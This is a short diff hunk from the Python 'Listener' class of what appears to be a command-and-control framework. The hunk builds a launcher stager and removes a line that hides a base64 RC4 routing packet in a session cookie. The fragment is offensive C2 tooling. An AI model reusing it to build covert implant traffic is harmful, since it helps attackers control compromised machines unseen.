@@ -452,9 +452,6 @@ class Listener(object):
                 
                 launcherBase += "req=urllib.Request(server+t);\n"
 
-                # add the RC4 packet to a cookie
-                launcherBase += "o.addheaders=[('User-Agent',UA), (\"Cookie\", \"session=%s\")];\n" % (b64RoutingPacket)
-
                 # Add custom headers if any
                 if customHeaders != []:
                     for header in customHeaders:
